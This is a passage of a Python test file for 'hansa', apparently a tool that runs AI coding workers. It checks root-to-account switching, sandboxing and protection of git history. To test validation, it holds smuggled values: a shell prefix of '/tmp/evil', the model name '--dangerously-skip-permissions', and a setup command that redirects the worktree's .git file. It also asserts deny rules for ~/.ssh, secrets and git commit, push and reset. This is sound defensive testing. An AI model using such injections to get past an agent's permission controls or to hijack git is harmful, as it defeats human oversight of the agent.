        mine.write_text(json.dumps({"permissions": {"allow": ["Bash(bh:*)"], "deny": ["Read(//x/.bh/**)"]},
                                    "env": {"KEEP": "1"}}))
        start = [str(Path(__file__).resolve().parent.parent / "bin" / "hansa"), "--desk", str(self.desk.root), "coordinator"]
        for _ in range(2):  # the second start finds nothing to change
            r = subprocess.run(start, capture_output=True, text=True, env={**os.environ, "HANSA_CLAUDE": str(echo)})
            self.assertEqual(r.returncode, 0, r.stderr)
        s = json.loads(mine.read_text())
        root = str(self.desk.root).lstrip("/")
        self.assertIn("Bash(hansa:*)", s["permissions"]["allow"])
        self.assertNotIn("Bash(bh:*)", s["permissions"]["allow"])
        self.assertIn(f"Read(//{root}/.hansa/**)", s["permissions"]["deny"])
        self.assertEqual(s["env"], {"KEEP": "1"})  # other settings there stay
        self.assertEqual(len(list(self.desk.state_dir.glob("coordinator-settings.json.*"))), 1)  # the old one, kept once

    # -- a Linux server: the desk belongs to an account, the coordinator is root ---------------------
    # Tests cannot run as root, so the lookups that decide it are replaced: hansa "runs as root" on
    # "Linux", and the desk's owner is the test's own user, which stands for the account.

    def as_root(self, desk_owner=None, linux=True):
        me = os.getuid()
        for p in (unittest.mock.patch.object(account, "LINUX", linux),
                  unittest.mock.patch.object(account, "uid", lambda: 0),
                  unittest.mock.patch.object(account, "owner", lambda path: me if desk_owner is None else desk_owner)):
            p.start()
            self.addCleanup(p.stop)

    def stand_in_runuser(self):
        """A runuser on PATH that records its arguments and runs the command (as the same user, here).
        hansa replaces itself with it; here the test runs it and ends the command instead."""
        log, bin_ = self.tmp / "runuser.jsonl", self.tmp / "sbin"
        bin_.mkdir(exist_ok=True)
        (bin_ / "runuser").write_text("#!/usr/bin/env python3\nimport json, os, sys\n"
                                      f"open({str(log)!r}, 'a').write(json.dumps(sys.argv[1:]) + '\\n')\n"
                                      "os.execvp(sys.argv[4], sys.argv[4:])\n")
        (bin_ / "runuser").chmod(0o755)
        path = unittest.mock.patch.dict(os.environ, {"PATH": f"{bin_}{os.pathsep}{os.environ['PATH']}"})
        path.start()
        self.addCleanup(path.stop)
        ran = []

        def execve(prog, args, env):
            ran.append(subprocess.run(args, env=env, capture_output=True, text=True))
            raise SystemExit(ran[-1].returncode)
        p = unittest.mock.patch.object(account.os, "execve", side_effect=execve)
        p.start()
        self.addCleanup(p.stop)
        return log, ran

    def test_as_root_on_an_accounts_linux_desk_commands_run_as_the_account(self):
        log, ran = self.stand_in_runuser()
        brief = self.tmp / "brief.md"
        brief.write_text("-Make the badge bigger\n")
        here = os.getcwd()
        os.chdir(self.tmp)
        self.addCleanup(os.chdir, here)
        self.as_root()
        real_run, fed = subprocess.run, []

        def gone_first(cmd, **kw):  # the account cannot read the file: only root's copy of the text counts
            brief.unlink()
            fed.append(kw.get("input"))
            return real_run(cmd, **kw)
        with unittest.mock.patch.object(account.subprocess, "run", side_effect=gone_first), \
                contextlib.redirect_stdout(io.StringIO()):
            with self.assertRaises(SystemExit) as done:
                main(["--desk", "desk", "add", "--file", str(brief), "--lane", "a"])
        self.assertEqual(done.exception.code, 0)  # the account's hansa's exit code
        me = account.name_of(os.getuid())
        args = json.loads(log.read_text().splitlines()[-1])
        self.assertEqual(args[:6], ["-u", me, "--", sys.executable, "-m", "hansa"])
        self.assertIn(f"--desk={self.desk.root}", args)  # a full path: the account starts elsewhere
        self.assertIn("--file=-", args)  # the text comes on standard input, not where every user sees it
        self.assertFalse([x for x in args if "Make the badge" in x or "file-text" in x or x == str(brief)])
        self.assertEqual(fed, ["-Make the badge bigger\n"])
        self.assertEqual((self.desk.tasks_dir / "t0001" / "task.md").read_text(), "-Make the badge bigger\n")
        self.assertEqual(self.desk.meta("t0001")["lane"], "a")
        with contextlib.redirect_stdout(io.StringIO()):
            with self.assertRaises(SystemExit):
                main(["--desk", str(self.desk.root), "lane", "add", "b", "--repo", "repo"])
        self.assertIn(f"--repo={self.repo.resolve()}", json.loads(log.read_text().splitlines()[-1]))
        self.assertIn("lane b added", ran[-1].stdout)
        n = len(log.read_text().splitlines())
        for owner, linux in ((0, True), (os.getuid(), False)):  # root's own desk; any desk off Linux
            with unittest.mock.patch.object(account, "owner", lambda path: owner), \
                    unittest.mock.patch.object(account, "LINUX", linux), contextlib.redirect_stdout(io.StringIO()):
                main(["--desk", str(self.desk.root), "add", "Another one"])
        with unittest.mock.patch.object(account, "uid", os.getuid), contextlib.redirect_stdout(io.StringIO()):
            main(["--desk", str(self.desk.root), "add", "A third one"])  # hansa not run as root
        self.assertEqual(len(log.read_text().splitlines()), n)  # none of these switched
        self.assertEqual([m["id"] for m in self.desk.tasks()], ["t0001", "t0002", "t0003", "t0004"])

    def test_without_runuser_hansa_says_what_it_needs(self):
        self.as_root()
        with unittest.mock.patch.object(account, "runuser_bin", lambda: ""):
            with self.assertRaises(SystemExit) as e:
                main(["--desk", str(self.desk.root), "status"])
        self.assertIn("needs runuser", str(e.exception.code))

    def coordinator_as_root(self, env):
        """Start the coordinator in this process as "root", catching the claude it would become."""
        started = {}
        with unittest.mock.patch.object(account.os, "execve", side_effect=AssertionError("it switched")), \
                unittest.mock.patch("os.execvpe", lambda prog, argv, e: started.update(argv=argv, env=e)), \
                unittest.mock.patch("os.chown", side_effect=AssertionError("root changed an owner")), \
                unittest.mock.patch.dict(os.environ, env), unittest.mock.patch("os.chdir"):
            main(["--desk", str(self.desk.root), "coordinator"])
        return started

    def test_the_coordinator_stays_root_leaves_the_desk_to_the_account_and_uses_roots_claude_folder(self):
        self.as_root()
        log, _ = self.stand_in_runuser()
        s = self.desk.settings()
        s["providers"]["claude"]["config_dir"] = str(self.tmp / "account-claude")
        self.assertEqual(self.desk.save_settings(s), [])
        (self.desk.root / "CLAUDE.md").write_text("an old card\n")
        root_wrote = AssertionError("root did the desk's part itself")
        with unittest.mock.patch("hansa.cli.coordinator_desk", side_effect=root_wrote), \
                unittest.mock.patch("hansa.cli._bring", side_effect=root_wrote):
            started = self.coordinator_as_root({"CLAUDE_CONFIG_DIR": str(self.tmp / "root-claude")})
        self.assertEqual(started["env"]["CLAUDE_CONFIG_DIR"], str(self.tmp / "root-claude"))  # root's, not the account's
        args = json.loads(log.read_text().splitlines()[-1])
        self.assertEqual(args[:2] + args[-3:], ["-u", account.name_of(os.getuid()), "coordinator-desk", "--by", "0"])
        # the account's hansa did the desk's part: the card, the helpers, the permissions, the record, the events
        self.assertEqual((self.desk.root / "CLAUDE.md").read_text(), (Path(__file__).resolve().parent.parent / "hansa" /
                                                                       "card.md").read_text())
        self.assertTrue((self.desk.root / ".claude" / "agents" / "operator.md").is_file())
        self.assertIn("permissions", json.loads((self.desk.root / ".claude" / "settings.json").read_text()))
        self.assertEqual(json.loads((self.desk.state_dir / "coordinator.json").read_text())["uid"], 0)
        self.assertIn("card_refreshed", self.desk.events_path.read_text())
        self.assertIn("--add-dir", started["argv"])
        self.assertIn(str(self.repo.resolve()), started["argv"])
        # not the desk's project settings, whose hooks the account could write: root's, and hansa's rules
        i = started["argv"].index("--setting-sources")
        self.assertEqual(started["argv"][i + 1], "user")
        rules = json.loads(started["argv"][started["argv"].index("--settings") + 1])["permissions"]
        self.assertIn(f"Read(//{str(self.desk.root).lstrip('/')}/secrets/**)", rules["deny"])
        without = {k: v for k, v in os.environ.items() if k != "CLAUDE_CONFIG_DIR"}
        with unittest.mock.patch.dict(os.environ, without, clear=True):
            started = self.coordinator_as_root({})
        self.assertNotIn("CLAUDE_CONFIG_DIR", started["env"])  # root's ~/.claude, as root starts Claude Code
        s["providers"]["mimo"] = {"kind": "compatible", "model": "mimo-x", "effort": "", "base_url": "https://x.invalid"}
        s["coordinator"]["provider"] = "mimo"
        self.assertEqual(self.desk.save_settings(s), [])
        self.desk.write_key("mimo", "sk-mimo-12345678")
        started = self.coordinator_as_root({"CLAUDE_CONFIG_DIR": str(self.tmp / "root-claude")})
        self.assertEqual(started["env"]["CLAUDE_CONFIG_DIR"], str(self.tmp / "root-claude"))
        self.assertEqual((started["env"]["ANTHROPIC_BASE_URL"], started["env"]["ANTHROPIC_AUTH_TOKEN"]),
                         ("https://x.invalid", "sk-mimo-12345678"))  # the provider's endpoint and key, as before

    def test_root_takes_only_the_providers_variables_and_a_sound_model_and_effort_from_the_accounts_plan(self):
        self.as_root()

        def plan_says(**over):  # what the account's hansa prints, which the account controls
            plan = {"repos": [str(self.repo.resolve()), "relative"], "model": "opus", "effort": "high",
                    "env": {"ANTHROPIC_BASE_URL": "https://x.invalid", "CLAUDE_CODE_MAX_RETRIES": "3",
                            "CLAUDE_CONFIG_DIR": "/account/claude", "CLAUDE_CODE_SHELL_PREFIX": "/tmp/evil",
                            "CLAUDE_CODE_SHELL": "/tmp/evil", "HOME": "/account"}}
            done = subprocess.CompletedProcess([], 0, json.dumps({**plan, **over}), "")
            return unittest.mock.patch.object(account, "run", lambda *x, **k: done)
        without = {k: v for k, v in os.environ.items() if not k.startswith(("CLAUDE_", "ANTHROPIC_"))}
        with plan_says(), unittest.mock.patch.dict(os.environ, without, clear=True):
            started = self.coordinator_as_root({})
        env = started["env"]
        self.assertEqual((env["ANTHROPIC_BASE_URL"], env["CLAUDE_CODE_MAX_RETRIES"]), ("https://x.invalid", "3"))
        for dropped in ("CLAUDE_CODE_SHELL_PREFIX", "CLAUDE_CODE_SHELL", "CLAUDE_CONFIG_DIR"):
            self.assertNotIn(dropped, env)
        self.assertNotEqual(env.get("HOME"), "/account")
        self.assertNotIn("relative", started["argv"])
        self.assertEqual(started["argv"][started["argv"].index("--model") + 1], "opus")
        for bad, says in (({"model": "--dangerously-skip-permissions"}, "not a model name"),
                          ({"model": "opus x"}, "not a model name"), ({"model": ""}, "not a model name"),
                          ({"effort": "--yolo"}, "is not one of")):
            with plan_says(**bad), self.assertRaises(SystemExit) as e:
                self.coordinator_as_root({})  # it would record the claude it became; it stops before
            self.assertIn(says, str(e.exception.code))
        with plan_says(model="claude-opus-4-5[1m]", effort=""):
            argv = self.coordinator_as_root({})["argv"]
        self.assertEqual(argv[argv.index("--model") + 1], "claude-opus-4-5[1m]")
        self.assertNotIn("--effort", argv)

    def test_init_for_an_account_refuses_a_link_or_a_folder_with_things_in_it(self):
        self.as_root()
        log, ran = self.stand_in_runuser()
        me = account.name_of(os.getuid())
        target = self.tmp / "system-dir"
        target.mkdir()
        (self.tmp / "planted").symlink_to(target)
        full = self.tmp / "full"
        full.mkdir()
        (full / "x").write_text("")
        given = []
        with unittest.mock.patch("os.chown", lambda *a, **kw: given.append((a, kw))):
            for d in ("planted", "full"):
                with self.assertRaises(SystemExit) as e:
                    main(["init", str(self.tmp / d), "--user", me])
                self.assertIn("must be a new or an empty folder", str(e.exception.code))
            self.assertEqual(given, [])  # nothing was given away
            self.assertFalse(log.exists())
            with self.assertRaises(SystemExit) as done:
                main(["init", str(self.tmp / "new-desk"), "--user", me])
        self.assertEqual(done.exception.code, 0, ran[-1].stderr)
        self.assertEqual(given[0][0][0], self.tmp / "new-desk")
        self.assertEqual(given[0][1], {"follow_symlinks": False})
        self.assertIn("init", json.loads(log.read_text().splitlines()[-1]))  # the rest ran as the account
        self.assertTrue((self.tmp / "new-desk" / "settings.json").is_file())

    def test_lane_brief_prints_and_replaces_the_standing_instructions(self):
        def run(*args, stdin=""):
            out = io.StringIO()
            with contextlib.redirect_stdout(out), unittest.mock.patch("sys.stdin", io.StringIO(stdin)):
                main(["--desk", str(self.desk.root), "lane", "brief", *args])
            return out.getvalue()
        self.assertIn("no standing instructions", run("a"))
        self.assertIn("replaced", run("a", "Run", "the", "linter", "first."))
        self.assertEqual(run("a"), "Run the linter first.\n")
        run("a", "--file", "-", stdin="Line one\nLine two\n")  # from standard input, as root hands it over
        self.assertEqual((self.desk.lanes_dir / "a" / "brief.md").read_text(), "Line one\nLine two\n")
        changed = [e for e in map(json.loads, self.desk.events_path.read_text().splitlines())
                   if e.get("event") == "lane_brief_changed"]
        self.assertEqual([(e["lane"], e["new"]) for e in changed],
                         [("a", "Run the linter first."), ("a", "Line one\nLine two\n")])
        with self.assertRaises(SystemExit):
            run("nope", "x")
        perms = json.loads((self.desk.root / ".claude" / "settings.json").read_text())["permissions"]
        self.assertIn(f"Edit(//{str(self.desk.root).lstrip('/')}/lanes/**)", perms["deny"])  # one way to change them

    def test_cost_says_the_coordinators_usage_is_not_counted_when_it_runs_as_another_user(self):
        echo = self.tmp / "echo-claude"
        echo.write_text("#!/bin/sh\necho \"$@\"\n")
        echo.chmod(0o755)
        start = [str(Path(__file__).resolve().parent.parent / "bin" / "hansa"), "--desk", str(self.desk.root), "coordinator"]
        r = subprocess.run(start, capture_output=True, text=True, env={**os.environ, "HANSA_CLAUDE": str(echo)})
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(cost.report(self.desk)["coordinator_uncounted"], "")  # the same user: counted
        with unittest.mock.patch.object(account, "uid", lambda: 0):  # now "root" starts it
            self.coordinator_as_root({})
        rep = cost.report(self.desk)
        self.assertIn("not counted", rep["coordinator_uncounted"])
        self.assertIn("runs as root", rep["coordinator_uncounted"])
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            main(["--desk", str(self.desk.root), "cost"])
        self.assertIn("coordinator's own usage and its helpers' are not counted", out.getvalue())

    def test_a_lane_repository_must_belong_to_the_user_hansa_runs_as(self):
        with unittest.mock.patch.object(account, "owner", lambda path: 4242):
            with self.assertRaises(SystemExit) as e:
                main(["--desk", str(self.desk.root), "lane", "add", "b", "--repo", str(self.repo)])
            self.assertIn("git refuses", str(e.exception.code))
            self.assertIn(f"chown -R {account.name_of(os.getuid())} {self.repo.resolve()}", str(e.exception.code))
            told = account.git_refusal(f"fatal: detected dubious ownership in repository at '{self.repo}'", self.repo)
            self.assertIn("chown -R", told)  # a task git refuses fails with this, not git's text
        self.assertNotIn("b", self.desk.settings()["lanes"])

    def test_join_a_design_session_by_its_sockets_full_path(self):
        m = {"tmux": ["hansa-abc123", "design-t0001"]}
        with unittest.mock.patch.dict(os.environ, {"TMUX_TMPDIR": str(self.tmp)}):
            self.assertEqual(join_command(m), f"tmux -u -S {self.tmp}/tmux-{os.getuid()}/hansa-abc123 attach -t design-t0001")
        with unittest.mock.patch.dict(os.environ, {k: v for k, v in os.environ.items() if k != "TMUX_TMPDIR"}, clear=True):
            self.assertEqual(join_command(m), f"tmux -u -S /tmp/tmux-{os.getuid()}/hansa-abc123 attach -t design-t0001")

    def test_login_advice_on_a_linux_server_gives_the_form_to_run_from_root(self):
        self.desk.set_provider_state("claude", cool_until=time.time() + 60, reason="not logged in (Please run /login)")
        s = self.desk.settings()
        s["providers"]["claude"]["config_dir"] = "/home/hansa/.claude"
        me = account.name_of(os.getuid())
        with unittest.mock.patch.object(account, "LINUX", True):
            prob = provider_problem(self.desk, s, "claude")
            self.assertIn(f"from root: `runuser -u {me} -- env CLAUDE_CONFIG_DIR=/home/hansa/.claude claude`", prob)
            s["providers"]["claude"]["config_dir"] = ""
            self.assertIn(f"from root: `runuser -u {me} -- claude`", provider_problem(self.desk, s, "claude"))
        with unittest.mock.patch.object(account, "LINUX", False):
            self.assertNotIn("runuser", provider_problem(self.desk, s, "claude"))  # not on macOS

    def test_workers_see_neither_the_desks_card_nor_the_users_own_setup(self):
        seen = self.tmp / "argv.jsonl"
        s = self.desk.settings()
        s["lanes"]["a"]["env"] = {"FAKE_SHOW_ARGV": str(seen)}
        self.assertEqual(self.desk.save_settings(s), [])
        m = self.settle(Dispatcher(self.desk), self.desk.new_task("Add hello.txt"))
        argv = json.loads(seen.read_text().splitlines()[-1])
        self.assertEqual(argv[argv.index("--setting-sources") + 1], "project,local")  # not the user's own
        self.assertIn("--strict-mcp-config", argv)  # no MCP servers but hansa's
        skipped = json.loads(argv[argv.index("--settings") + 1])["claudeMdExcludes"]
        self.assertIn(str(self.desk.root / "CLAUDE.md"), skipped)  # the desk's card is the coordinator's
        self.assertNotIn(str(Path(m["worktree"]) / "CLAUDE.md"), skipped)  # the checkout's own stays

    def test_the_provider_check_runs_the_way_workers_do(self):
        from hansa import run
        seen = {}

        def answer(argv, **kwargs):
            seen["argv"] = argv
            return subprocess.CompletedProcess(argv, 0, json.dumps({"type": "result", "result": "OK",
                                                                     "modelUsage": {"claude-x": {}}}), "")
        with unittest.mock.patch.object(run.subprocess, "run", answer):
            self.assertTrue(run.check_provider(self.desk, "claude")["ok"])
        self.assertIn("--strict-mcp-config", seen["argv"])
        self.assertIn(str(self.desk.root / "CLAUDE.md"),
                      json.loads(seen["argv"][seen["argv"].index("--settings") + 1])["claudeMdExcludes"])

    @staticmethod
    def sandbox_of(argv):
        return json.loads(argv[argv.index("--settings") + 1]).get("sandbox")

    @staticmethod
    def denied_by(argv):
        return argv[argv.index("--disallowedTools") + 1:argv.index("--allowedTools")]

    def test_workers_run_in_the_sandbox_and_leave_git_history_to_hansa(self):
        seen = self.tmp / "argv.jsonl"
        s = self.desk.settings()
        s["lanes"]["a"]["env"] = {"FAKE_SHOW_ARGV": str(seen)}
        s["lanes"]["a"]["network"] = ["registry.npmjs.org", "*.pypi.org"]
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        self.assertEqual(self.settle(Dispatcher(self.desk), tid)["state"], "done")
        argv = json.loads(seen.read_text().splitlines()[-1])
        box = self.sandbox_of(argv)
        self.assertEqual((box["enabled"], box["failIfUnavailable"], box["autoAllowBashIfSandboxed"],
                          box["allowUnsandboxedCommands"]), (True, True, True, False))
        self.assertEqual(box["network"], {"allowedDomains": ["registry.npmjs.org", "*.pypi.org"],
                                          "strictAllowlist": True})  # no local server without localhost
        for d in (self.desk.secrets_dir, self.desk.state_dir, Path.home() / ".ssh", Path.home() / ".claude.json"):
            self.assertIn(str(d), box["filesystem"]["denyRead"])
        self.assertEqual(box["credentials"]["envVars"], [{"name": "ANTHROPIC_AUTH_TOKEN", "mode": "deny"},
                                                         {"name": "ANTHROPIC_API_KEY", "mode": "deny"}])
        self.assertIn("claudeMdExcludes", json.loads(argv[argv.index("--settings") + 1]))  # one object, both in it
        # git history is kept by the sandbox too: the lane's linked worktree's git folders, worked out for real
        wt = Path(self.desk.meta(tid)["worktree"])
        common = (self.repo / ".git").resolve()
        own = Path(subprocess.run(["git", "rev-parse", "--absolute-git-dir"], cwd=wt, capture_output=True,
                                  text=True, check=True).stdout.strip()).resolve()
        self.assertNotEqual(own, common)  # a linked worktree has its own folder under the common one
        self.assertEqual(own.parent.parent, common)
        for f in ("objects", "refs", "packed-refs", "HEAD", "config", "hooks", "info", "logs"):
            self.assertIn(str(common / f), box["filesystem"]["denyWrite"])
        for f in ("HEAD", "logs", "commondir", "gitdir"):
            self.assertIn(str(own / f), box["filesystem"]["denyWrite"])
        self.assertNotIn(str(wt.resolve()), box["filesystem"]["denyWrite"])  # the worktree itself stays writable
        deny = self.denied_by(argv)
        for c in ("commit", "push", "merge", "reset", "stash", "switch", "branch", "checkout", "restore"):
            self.assertIn(f"Bash(git {c}:*)", deny)

        s = self.desk.settings()
        s["lanes"]["a"]["network"] = ["localhost"]
        self.assertEqual(self.desk.save_settings(s), [])
        with contextlib.redirect_stdout(io.StringIO()):
            main(["--desk", str(self.desk.root), "verify", tid])
        self.settle(Dispatcher(self.desk), self.desk.meta(tid)["verify"])
        argv = json.loads(seen.read_text().splitlines()[-1])
        self.assertIn("checking another worker's finished task", argv[argv.index("--append-system-prompt") + 1])
        box = self.sandbox_of(argv)
        self.assertEqual((box["enabled"], box["allowUnsandboxedCommands"]), (True, False))
        self.assertEqual(box["network"], {"allowedDomains": ["localhost"], "strictAllowlist": True,
                                          "allowLocalBinding": True})
        deny = self.denied_by(argv)
        self.assertIn("Bash(git commit:*)", deny)
        self.assertIn("Bash(git stash:*)", deny)
        self.assertNotIn("Bash(git checkout:*)", deny)  # a verification may put code back to see a test fail
        self.assertNotIn("Bash(git restore:*)", deny)
        self.assertIn("Bash(git checkout:*)", argv)
        self.assertIn(str(common / "refs"), box["filesystem"]["denyWrite"])

    def test_the_sandbox_keeps_workers_from_the_worktrees_git_file(self):
        from hansa import run
        wt = self.tmp / "wt"
        sh("git", "worktree", "add", "--detach", str(wt), cwd=self.repo)
        deny = run.git_write_deny(wt)
        self.assertIn(str(wt / ".git"), deny)
        self.assertIn(str(wt.resolve() / ".git"), deny)  # with links resolved too (/var is /private/var on macOS)

    def test_the_git_paths_the_sandbox_keeps_are_made_when_missing(self):
        # on Linux the sandbox puts a device nobody can open where a listed path is missing, and git fails on it
        from hansa import run
        packed = self.repo / ".git" / "packed-refs"
        self.assertFalse(packed.exists())  # a repository made with git init has none until refs are packed
        m = self.settle(Dispatcher(self.desk), self.desk.new_task("Add hello.txt"))
        self.assertEqual(m["state"], "done", m)
        self.assertEqual(packed.read_text(), "")
        wt = Path(m["worktree"])
        own = Path(self.git_out("rev-parse", "--absolute-git-dir", cwd=wt))
        for f in run.GIT_OWN_DENY:
            self.assertTrue((own / f).exists(), f)
        self.assertTrue((own / "logs").is_dir())
        self.assertEqual(self.git_out("status", "--porcelain", cwd=wt), "")  # git_out fails if git does
        self.assertEqual(self.git_out("log", "--format=%H", cwd=wt).splitlines()[0], m["head"])
        self.assertEqual(self.git_out("status", "--porcelain"), "")

        sh("git", "pack-refs", "--all", cwd=self.repo)  # a repository whose packed-refs holds refs keeps them
        held = packed.read_text()
        self.assertIn("refs/heads/main", held)
        lane = self.desk.settings()["lanes"]["a"]
        pname = lane["providers"][0]
        run.lane_sandbox(self.desk, lane, pname, self.desk.settings()["providers"][pname], wt)
        self.assertEqual(packed.read_text(), held)
        self.assertIn("init", self.git_out("log", "--oneline", "main"))

    def test_a_worktree_whose_git_file_was_redirected_gets_no_git_and_is_put_right(self):
        marker = self.tmp / "hook-ran"
        s = self.desk.settings()
        s["lanes"]["a"]["env"] = {"FAKE_REDIRECT_GIT": str(marker)}
        self.assertEqual(self.desk.save_settings(s), [])
        d = Dispatcher(self.desk)
        tid = self.desk.new_task("Add hello.txt")
        m = self.settle(d, tid)
        wt = Path(m["worktree"])
        self.assertEqual(m["state"], "failed", m)
        self.assertIn("the worktree's .git file was changed: it now points to", m["error"])
        self.assertIn(str(wt / "copied-git"), m["error"])
        self.assertFalse(marker.exists())  # hansa did not commit through the copy, so its hook never ran
        seen = [e for e in map(json.loads, self.desk.events_path.read_text().splitlines())
                if e["event"] == "worktree_git_changed"]
        self.assertEqual([e["task"] for e in seen], [tid])
        kept = list((self.desk.state_dir / "runs" / tid).glob("worktree-git-*"))
        self.assertEqual(len(kept), 1)
        self.assertIn("copied-git", (kept[0] / "found.git").read_text())
        self.assertTrue((kept[0] / "hooks" / "post-commit").exists())
        own = (self.repo / ".git" / "worktrees" / wt.name).resolve()
        self.assertEqual(Path((wt / ".git").read_text().split(":", 1)[1].strip()).resolve(), own)
        self.assertIn("was changed", views.show_text(self.desk, tid))

        s["lanes"]["a"]["env"] = {}
        self.assertEqual(self.desk.save_settings(s), [])
        m = self.settle(d, self.desk.new_task("Add hello.txt again"))
        self.assertEqual((m["state"], m["files"]), ("done", ["hello.txt"]), m)
        self.assertEqual(Path((wt / ".git").read_text().split(":", 1)[1].strip()).resolve(), own)
        self.assertFalse(marker.exists())

    def test_a_git_file_changed_between_tasks_is_caught_before_any_git_runs(self):
        from hansa import run
        lane = self.desk.settings()["lanes"]["a"]
        first = self.desk.new_task("Add hello.txt")
        wt, _ = run.prepare(self.desk, "a", lane, self.desk.meta(first))
        right = (wt / ".git").read_text()
        copy = self.tmp / "copied-git"
        (copy / "hooks").mkdir(parents=True)
        (wt / ".git").write_text(f"gitdir: {copy}\n")
        tid = self.desk.new_task("Add hello.txt again")
        with unittest.mock.patch.object(run, "git", wraps=run.git) as ran:
            with self.assertRaisesRegex(RuntimeError, f"the worktree's .git file was changed: it now points to {copy}"):
                run.prepare(self.desk, "a", lane, self.desk.meta(tid))
            self.assertFalse([c for c in ran.call_args_list if c.kwargs.get("cwd") == wt])
        self.assertEqual((wt / ".git").read_text(), right)  # put back for the next task
        self.assertIn(f"gitdir: {copy}", next((self.desk.state_dir / "runs" / tid).glob("worktree-git-*/found.git"))
                      .read_text())
        self.assertIn("worktree_git_changed", self.desk.events_path.read_text())
        (wt / ".git").unlink()
        (wt / ".git").mkdir()  # a folder, not the file git wrote
        self.desk.update(first, head="HEAD", base="HEAD", worktree=str(wt))
        self.assertIn("it is now a folder", views.diff_text(self.desk, first))  # no diff through it either
        with self.assertRaisesRegex(RuntimeError, "it is now a folder"):
            run.prepare(self.desk, "a", lane, self.desk.meta(tid))
        self.assertEqual(run.prepare(self.desk, "a", lane, self.desk.meta(tid))[0], wt)  # the lane works again

    def test_a_git_file_changed_by_the_lanes_setup_stops_the_task_before_its_worker(self):
        s = self.desk.settings()
        s["lanes"]["a"]["setup"] = "echo 'gitdir: /elsewhere' > .git"
        self.assertEqual(self.desk.save_settings(s), [])
        d = Dispatcher(self.desk)
        m = self.settle(d, self.desk.new_task("Add hello.txt"))
        self.assertEqual(m["state"], "failed", m)
        self.assertIn("it now points to /elsewhere", m["error"])
        s["lanes"]["a"]["setup"] = ""
        self.assertEqual(self.desk.save_settings(s), [])
        m = self.settle(d, self.desk.new_task("Add hello.txt again"))
        self.assertEqual((m["state"], m["files"]), ("done", ["hello.txt"]), m)

    def test_a_local_host_in_any_case_or_as_127_0_0_1_allows_local_binding(self):
        from hansa import run
        p = self.desk.settings()["providers"]["claude"]

        def local(hosts):
            box = run.sandbox_settings(self.desk, {"network": hosts}, "claude", p, self.repo)["sandbox"]
            return box["network"].get("allowLocalBinding", False)
        for hosts in (["localhost"], ["LOCALHOST"], ["Localhost:8080"], ["127.0.0.1"], ["127.0.0.1:3000"],
                      ["registry.npmjs.org", "localhost:5173"]):
            self.assertTrue(local(hosts), hosts)
        for hosts in ([], ["registry.npmjs.org"], ["localhost.example.org"], ["127.0.0.2"], ["*.localhost"]):
            self.assertFalse(local(hosts), hosts)

    def test_a_lanes_write_list_is_checked(self):
        s = self.desk.settings()
        cache = self.tmp / "m2"
        s["lanes"]["a"]["write"] = [str(cache), "/opt/cache/npm"]
        self.assertEqual(validate(s, self.desk.root), [])
        for bad in (["m2"], ["~/.m2"], [str(cache), 3], "/opt/cache", [f"/opt/c{i}" for i in range(21)]):
            s["lanes"]["a"]["write"] = bad
            self.assertEqual(validate(s, self.desk.root),
                             ["lane a: write must be a list of up to 20 full paths starting with /, such as /Users/me/.m2"])
        # the desk (as given, resolved, inside it or around it) and the repository's .git
        for bad in (self.tmp / "desk", self.tmp / "desk" / "secrets", self.desk.root / ".hansa" / "runs", self.tmp,
                    self.tmp / "x" / ".." / "desk"):
            s["lanes"]["a"]["write"] = [str(bad)]
            self.assertEqual(validate(s, self.desk.root), [f"lane a: write cannot include {bad}: it is the desk's, "
                                                           "which holds the keys and hansa's state"], bad)
        for bad in (self.repo / ".git", self.repo / ".git" / "hooks", self.repo.resolve() / ".git" / "refs"):
            s["lanes"]["a"]["write"] = [str(bad)]
            self.assertEqual(validate(s, self.desk.root), [f"lane a: write cannot include {bad}: it is the "
                                                           "repository's .git folder, whose history hansa keeps"])
        before = self.desk.settings_path.read_text()
        with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit) as e:
            main(["--desk", str(self.desk.root), "lane", "set", "a", "write", str(self.desk.secrets_dir)])
        self.assertIn("it is the desk's", str(e.exception.code))
        self.assertEqual(self.desk.settings_path.read_text(), before)

    def test_a_lanes_write_list_opens_nothing_the_sandbox_keeps_closed(self):
        home, bin_ = self.tmp / "home", self.tmp / "tools" / "bin"
        (home / ".cache").mkdir(parents=True)
        (home / "link").symlink_to(home / ".ssh")
        s = self.desk.settings()
        s["providers"]["claude"]["config_dir"] = str(self.tmp / "cfg")

        def refused(x):
            s["lanes"]["a"]["write"] = [str(x)]
            return validate(s, self.desk.root)

        with unittest.mock.patch.dict(os.environ, {"HOME": str(home), "PATH": f"{bin_}:relative/bin:/usr/bin"}):
            for ok in (home / ".m2", home / ".cache" / "pip", self.tmp / "tools" / "cache"):  # a tool's cache
                self.assertEqual(refused(ok), [], ok)
            for x in (home, self.tmp, self.tmp.parent):  # the home folder, or above it (before the desk)
                self.assertEqual(refused(x), [f"lane a: write cannot include {x}: it would open {home}, "
                                              "the home folder of the user hansa runs as"], x)
            for x in (self.tmp / "cfg", self.tmp / "cfg" / "projects"):  # the provider's Claude Code folder
                self.assertEqual(refused(x), [f"lane a: write cannot include {x}: it would open {self.tmp / 'cfg'}, "
                                              "provider claude's Claude Code folder, which workers may not read"])
            for x, f in ((home / ".ssh", ".ssh"), (home / ".config", ".config/gh"), (home / ".aws" / "sso", ".aws"),
                         (home / "link", ".ssh")):  # a login or key: inside, around, or through a link
                self.assertEqual(refused(x), [f"lane a: write cannot include {x}: it would open {home / f}, "
                                              "a login or key that workers may not read"], x)
            for x in (bin_, self.tmp / "tools", Path("/usr")):  # a folder on the PATH, or above one
                d = bin_ if x != Path("/usr") else "/usr/bin"
                self.assertEqual(refused(x), [f"lane a: write cannot include {x}: it would open {d}, "
                                              "a folder on the PATH hansa runs with"], x)
            self.assertEqual(refused(bin_ / "sub"), [])  # inside a PATH folder is not above one
            for x in (self.repo, self.repo / "src"):  # the lane's repository, or inside it
                self.assertEqual(refused(x), [f"lane a: write cannot include {x}: it would open {s['lanes']['a']['repo']}, "
                                              "the lane's repository; workers change code only in their worktree"])
            s["providers"]["claude"]["config_dir"] = ""  # ~/.claude by default
            self.assertIn("provider claude's Claude Code folder", refused(home / ".claude")[0])
            before = self.desk.settings_path.read_text()
            with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit) as e:
                main(["--desk", str(self.desk.root), "lane", "set", "a", "write", str(home / ".m2"), str(home)])
